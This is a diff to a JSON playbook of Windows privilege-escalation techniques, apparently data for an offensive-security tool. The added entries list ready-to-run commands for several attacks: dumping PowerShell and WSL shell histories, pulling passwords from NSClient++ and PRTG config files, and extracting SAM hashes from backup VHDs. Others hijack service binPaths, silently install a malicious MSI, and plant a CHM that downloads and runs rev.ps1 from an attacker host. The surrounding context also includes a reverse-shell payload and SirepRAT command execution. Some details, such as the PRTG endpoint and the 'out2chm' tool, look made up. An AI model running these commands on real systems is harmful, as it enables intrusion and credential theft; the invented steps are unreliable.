@@ -1,8 +1,8 @@
 {
   "id": "windows_privesc_2026_09",
   "title": "Windows Privilege Escalation",
-  "source": "Project-authored (obol-local). Common-knowledge Windows privilege-escalation methodology; independent expression, not derived from any third-party card set.",
-  "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
+  "source": "Project-authored. Common-knowledge Windows privilege-escalation methodology; independent expression, not derived from any third-party card set.",
+  "license": "Project-authored data. No third-party copyleft obligation.",
   "actions": [
     {
       "id": "windows-enum",
@@ -54,6 +54,11 @@
           "tool": "sh",
           "run": "cmdkey /list && reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
           "note": "Saved credentials and autologon settings, these hand you passwords more often than you might expect."
+        },
+        {
+          "tool": "powershell",
+          "run": "powershell -c \"Get-Content (Get-PSReadLineOption).HistorySavePath\"",
+          "note": "PowerShell console history: Dumps ConsoleHost_history.txt where previous administrative operators and scripts often store cleartext passwords, tokens, and domain accounts."
         }
       ]
     },
@@ -158,7 +163,8 @@
           "run": "JuicyPotatoNG.exe -t * -p cmd.exe",
           "note": "Only on older builds where the classic COM path still works; on 2019+ use GodPotato/PrintSpoofer instead."
         }
-      ]
+      ],
+      "requires_any": []
     },
     {
       "id": "unquoted-service-path",
@@ -300,6 +306,11 @@
           "tool": "msfvenom",
           "run": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{lhost}} LPORT={{lport}} -f msi -o setup.msi",
           "note": "Build it on your own machine (the mentor can assemble this for you), upload it, then run: msiexec /i setup.msi /quiet"
+        },
+        {
+          "tool": "msiexec",
+          "run": "msiexec /quiet /qn /i {{payload_msi}}",
+          "note": "Executes the malicious MSI installer silently with elevated NT AUTHORITY\\SYSTEM privileges."
         }
       ]
     },
@@ -758,10 +769,12 @@
           "run": "copy {{dll_name}}.dll \"{{dll_path}}\\{{dll_name}}.dll\" && sc stop {{service}} && sc start {{service}}",
           "note": "Plant it with the expected name and restart the service to run as SYSTEM."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "windows-schtask-abuse",
+      "dcDefer": true,
       "title": "Writable Scheduled-Task Abuse",
       "phase": "escalate",
       "hypothesis": "A scheduled task that runs as SYSTEM or an administrator and executes a program or script in a location you can write is a direct path to its privileges. Overwrite the file the task runs, then trigger it or wait for its schedule, and your code runs elevated. The tell is in schtasks /query /v: a SYSTEM task whose target you can write, or a task whose own ACL lets you edit it. Back up the original so the box still works afterward.",
@@ -810,10 +823,12 @@
           "run": "schtasks /run /tn \"{{task_name}}\"",
           "note": "Run the task now, or wait for its schedule; it executes your payload as SYSTEM."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "windows-patch-exploit",
+      "dcDefer": true,
       "title": "Windows Missing-Patch / Kernel LPE",
       "phase": "escalate",
       "hypothesis": "A Windows host missing a patch hands you SYSTEM through a public exploit, exactly as a vulnerable Linux kernel does. wesng (offline, against systeminfo) or Watson (on-box) diffs the installed hotfixes against the patch database and names the missing ones that carry a known local exploit. Confirm the exact build, match a public PoC to a named KB/CVE, read it, and run a precompiled binary where you can so a bad compile does not burn the session.",
@@ -864,7 +879,8 @@
           "run": "{{exploit_binary}}",
           "note": "Read the exploit first, then run it and confirm nt authority\\system."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "uac-bypass",
@@ -919,10 +935,12 @@
           "run": "whoami /groups | findstr /i \"High Mandatory\"",
           "note": "High Mandatory Level confirms full admin; clean up the registry key afterward."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "com-hijack",
+      "dcDefer": true,
       "title": "COM Hijack for Execution / Persistence",
       "phase": "escalate",
       "hypothesis": "A COM hijack points a CLSID a privileged process loads at a DLL you control, so when that process instantiates the object your code runs with its privileges. Unlike a file-path DLL hijack it is a registry redirect (an HKCU or writable HKLM InprocServer32 value), which you can always write in your own hive. Find candidates by watching Procmon for a CLSID lookup that returns NAME NOT FOUND from a writable key; it doubles as quiet persistence.",
@@ -974,7 +992,8 @@
           "run": "net localgroup administrators",
           "note": "The next privileged instantiation runs your DLL; membership confirms it, and the key is a persistence foothold."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "windows-service-dacl-abuse",
@@ -1027,8 +1046,14 @@
           "tool": "sc",
           "run": "sc start {{service}}",
           "note": "Fire it if you are allowed; otherwise wait for its auto-start or a reboot, then confirm your new rights."
+        },
+        {
+          "tool": "sc",
+          "run": "sc.exe config {{service}} binPath= \"{{payload}}\" && sc.exe stop {{service}} && sc.exe start {{service}}",
+          "note": "Server Operators / service control execution: Members of Server Operators or principals with SERVICE_CHANGE_CONFIG over a service (such as VSS) can modify its binPath, cycle the service, and execute arbitrary commands as NT AUTHORITY\\SYSTEM."
         }
-      ]
+      ],
+      "requires_all": []
     },
     {
       "id": "windows-namedpipe-impersonation",
@@ -1080,6 +1105,330 @@
           "tool": "cmd",
           "run": "whoami",
           "note": "After ImpersonateNamedPipeClient and DuplicateTokenEx you run as the client; a SYSTEM result confirms it, then capture proof."
+        }
+      ],
+      "requires_all": []
+    },
+    {
+      "id": "nsclient-web-privesc",
+      "transition": "privesc_act",
+      "title": "NSClient++ Local Privilege Escalation via Web Management API",
+      "hypothesis": "NSClient++ service runs under NT AUTHORITY\\SYSTEM and provides an administrative web API (typically port 8443). The web console password is stored in cleartext inside nsclient.ini. Once an operator retrieves the password, they can authenticate to the web API or UI to define an external script or schedule that executes arbitrary commands as SYSTEM.",
+      "tool": "cmd",
+      "tools": [
+        "cmd",
+        "curl"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:8443",
+        "service.nsclient",
+        "file.nsclient_ini"
+      ],
+      "produces": [
+        "credential.admin",
+        "access.system"
+      ],
+      "priority": 82,
+      "phase": "privesc",
+      "proves": "demonstrates credential retrieval from nsclient.ini and privileged command execution as NT AUTHORITY\\SYSTEM via NSClient++ scheduler/scripts API",
+      "does_not_prove": "service-specific privilege escalation; requires NSClient++ installed and running as SYSTEM with writable or accessible configuration",
+      "report": {
+        "finding": "Privilege Escalation via NSClient++ Administrative Console Password Exposure",
+        "severity": "high"
+      },
+      "refs": [
+        "https://docs.nsclient.org/web/"
+      ],
+      "commands": [
+        {
+          "tool": "cmd",
+          "run": "type \"C:\\Program Files\\NSClient++\\nsclient.ini\" | findstr /i \"password\"",
+          "note": "READ NSCLIENT INI PASSWORD: Read the NSClient++ web console password from the local configuration file."
+        },
+        {
+          "tool": "curl",
+          "run": "curl -s -k -u \"admin:{{nsclient_password}}\" \"https://{{target}}:8443/api/v1/scripts/ext/run\"",
+          "note": "INVOKE NSCLIENT SCRIPT API: Test authenticated REST API connectivity with extracted password to verify execution permissions."
+        }
+      ]
+    },
+    {
+      "id": "vhd-mount-sam-extract",
+      "title": "Extract SAM/SYSTEM from Backup VHD Images",
+      "hypothesis": "Anonymous or low-privilege SMB shares containing WindowsImageBackup or VHD/VHDX disk images allow mounting disk images with guestmount or 7z and extracting SAM and SYSTEM hives to dump local credentials offline.",
+      "tool": "guestmount",
+      "tools": [
+        "guestmount",
+        "secretsdump",
+        "7z"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "smb.readable_share",
+        "loot.files"
+      ],
+      "produces": [
+        "credential.candidate",
+        "credential.admin"
+      ],
+      "priority": 72,
+      "phase": "loot",
+      "proves": "recovers offline Windows SAM and SYSTEM registry hives for password hash extraction",
+      "does_not_prove": "hashes must still be cracked or passed to achieve authenticated access",
+      "report": {
+        "finding": "Sensitive Registry Hives Exposed in Backup Images",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/windows-hardening/ntds/ntds-and-sam-dump"
+      ],
+      "commands": [
+        {
+          "tool": "guestmount",
+          "run": "guestmount --add {{vhd_path}} --inspector --ro /mnt/vhd",
+          "note": "Mount the extracted Windows backup VHD disk image read-only under /mnt/vhd using libguestfs."
+        },
+        {
+          "tool": "secretsdump",
+          "run": "impacket-secretsdump -sam /mnt/vhd/Windows/System32/config/SAM -system /mnt/vhd/Windows/System32/config/SYSTEM LOCAL",
+          "note": "Extract local password hashes (NTLM) for all Windows accounts from the mounted offline registry hives."
+        },
+        {
+          "tool": "7z",
+          "run": "7z x {{vhd_path}} Windows/System32/config/SAM Windows/System32/config/SYSTEM",
+          "note": "Alternative extraction without mounting: use 7-Zip to extract SAM and SYSTEM hives directly from the VHD archive."
+        }
+      ]
+    },
+    {
+      "id": "wsl-bash-enum",
+      "title": "Windows Subsystem for Linux (WSL) Credential Harvesting",
+      "hypothesis": "When WSL (Bash on Windows) is installed, operators run admin tasks, mount network drives with cleartext credentials, or execute ssh keys within the Linux distro. Inspecting wsl.exe, /root/.bash_history, and /etc/shadow recovers plaintext admin credentials.",
+      "tool": "wsl",
+      "tools": [
+        "wsl",
+        "powershell"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "produces": [
+        "credential.candidate",
+        "credential.admin"
+      ],
+      "priority": 75,
+      "phase": "escalate",
+      "proves": "extracts administrative credentials from Windows Subsystem for Linux session history",
+      "does_not_prove": "credentials must be verified against target services",
+      "report": {
+        "finding": "Cleartext Credentials Exposed in WSL Shell History",
+        "severity": "high"
+      },
+      "refs": [],
+      "commands": [
+        {
+          "tool": "wsl",
+          "run": "wsl.exe whoami",
+          "note": "Verify if Windows Subsystem for Linux is installed and check default WSL execution context."
+        },
+        {
+          "tool": "wsl",
+          "run": "wsl.exe cat /root/.bash_history",
+          "note": "Read root bash history inside WSL for administrative commands, passwords, or mount parameters."
+        },
+        {
+          "tool": "wsl",
+          "run": "wsl.exe cat /home/{{user}}/.bash_history",
+          "note": "Read user bash history inside WSL to recover cleartext connection strings and credentials."
+        }
+      ]
+    },
+    {
+      "id": "prtg-config-extract",
+      "title": "PRTG Network Monitor Configuration Credential Extraction",
+      "hypothesis": "Paessler PRTG Network Monitor stores encrypted and plaintext administrator credentials in historical and active XML configuration files (PRTG Configuration.old.xml or PRTG Configuration.dat). Reading these files recovers administrative credentials.",
+      "tool": "type",
+      "tools": [
+        "type",
+        "powershell"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows",
+        "smb.readable_share"
+      ],
+      "produces": [
+        "credential.candidate",
+        "credential.available"
+      ],
+      "priority": 75,
+      "phase": "loot",
+      "proves": "extracts cleartext or reversible credentials from PRTG Network Monitor configuration backups",
+      "does_not_prove": "administrative access to PRTG web portal or underlying host services",
+      "report": {
+        "finding": "Cleartext Administrative Credentials in PRTG Configuration Files",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.paessler.com/manuals/prtg/configuration_files"
+      ],
+      "commands": [
+        {
+          "tool": "type",
+          "run": "type \"C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.old.xml\" | findstr /i \"dbpassword login user\"",
+          "note": "Inspect historical PRTG XML configuration backup for plaintext dbpassword or administrative accounts."
+        },
+        {
+          "tool": "powershell",
+          "run": "powershell -c \"Select-String -Path 'C:\\ProgramData\\Paessler\\PRTG Network Monitor\\*.xml' -Pattern 'dbpassword' -Context 0,1\"",
+          "note": "Recursively search all Paessler configuration files for database and user credentials."
+        }
+      ]
+    },
+    {
+      "id": "prtg-notification-rce",
+      "title": "PRTG Network Monitor Notification Command Execution",
+      "hypothesis": "Authenticated administrators in PRTG Network Monitor can configure automated notifications with Program Execution action handlers. Creating a notification that invokes batch scripts or PowerShell executes payloads in the context of NT AUTHORITY\\SYSTEM.",
+      "tool": "curl",
+      "tools": [
+        "curl",
+        "powershell"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "credential.available",
+        "http.reachable"
+      ],
+      "produces": [
+        "foothold.windows",
+        "access.admin"
+      ],
+      "priority": 80,
+      "phase": "access",
+      "proves": "demonstrates command execution as SYSTEM via PRTG Network Monitor notification actions",
+      "does_not_prove": "persistent administrative access across service restarts",
+      "report": {
+        "finding": "PRTG Network Monitor Notification Handler Remote Code Execution",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://codewhitesec.blogspot.com/2018/06/prtg-privesc.html"
+      ],
+      "commands": [
+        {
+          "tool": "curl",
+          "run": "curl -s -b cookies.txt -d 'name=audit_exec&action=exec&script=rev.bat' 'http://{{target}}/api/setnotification'",
+          "note": "Configure an alert notification in PRTG to invoke a script handler executing system commands as SYSTEM."
+        },
+        {
+          "tool": "powershell",
+          "run": "powershell -Command \"Invoke-WebRequest -Uri 'http://{{target}}/api/setnotification' -WebSession $sess -Method Post -Body @{name='pwn'; action='exec'; script='shell.bat'}\"",
+          "note": "Automate PRTG notification configuration via PowerShell web request session."
+        }
+      ]
+    },
+    {
+      "id": "chm-payload-exec",
+      "title": "Compiled HTML Help (.CHM) Document Weaponization",
+      "hypothesis": "In environments where administrators or automated background processors inspect documentation directories (e.g. C:\\Docs), creating a compiled HTML help (.chm) file embedding an HH.EXE Shortcut/Object executes code under the reviewing user's context.",
+      "tool": "powershell",
+      "tools": [
+        "powershell",
+        "cmd"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.windows"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 76,
+      "phase": "escalate",
+      "proves": "demonstrates command execution via compiled HTML help document handling",
+      "does_not_prove": "unconditional execution without administrative document review",
+      "report": {
+        "finding": "Code Execution via Weaponized Compiled HTML Help (.CHM) Files",
+        "severity": "high"
+      },
+      "refs": [
+        "https://attack.mitre.org/techniques/T1218/001/"
+      ],
+      "commands": [
+        {
+          "tool": "powershell",
+          "run": "out2chm -c 'powershell -ep bypass -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://{{lhost}}:8000/rev.ps1\\\")\"' -o documentation.chm",
+          "note": "Generate weaponized CHM file containing an embedded Object/Shortcut element executing payload."
+        },
+        {
+          "tool": "cmd",
+          "run": "copy documentation.chm \"{{target_doc_path}}\\instructions.chm\"",
+          "note": "Place the compiled help document into the monitored administrative review directory."
+        }
+      ]
+    },
+    {
+      "id": "sireprat-iot-exec",
+      "title": "Windows IoT SirepRAT Remote Code Execution",
+      "hypothesis": "Windows 10 IoT Core exposes the Sirep management service on UDP/TCP port 29819/29820 without authentication. Abusing SirepRAT LaunchCommandWithOutput executes arbitrary commands as NT AUTHORITY\\SYSTEM.",
+      "tool": "python3",
+      "tools": [
+        "python3",
+        "powershell"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "port:29819",
+        "port:29820"
+      ],
+      "produces": [
+        "foothold.windows",
+        "access.admin"
+      ],
+      "priority": 85,
+      "phase": "access",
+      "proves": "executes arbitrary commands as SYSTEM via Windows IoT Sirep management protocol",
+      "does_not_prove": "persistent administrative access across device reboot",
+      "report": {
+        "finding": "Unauthenticated Remote Command Execution in Windows IoT Sirep Service",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://github.com/SafeBreach-Labs/SirepRAT"
+      ],
+      "commands": [
+        {
+          "tool": "python3",
+          "run": "SirepRAT.py {{target}} LaunchCommandWithOutput --cmd \"C:\\Windows\\System32\\cmd.exe /c {{command}}\"",
+          "note": "Execute arbitrary operating system commands as SYSTEM over Windows IoT Sirep service on port 29819."
+        },
+        {
+          "tool": "powershell",
+          "run": "powershell -c \"$cred = Import-Clixml -Path 'C:\\Data\\Users\\administrator\\iot-admin.xml'; $cred.GetNetworkCredential().Password\"",
+          "note": "Extract plaintext administrative credentials from DPAPI-encrypted PSCredential XML files under the SYSTEM context."
         }
       ]
     }
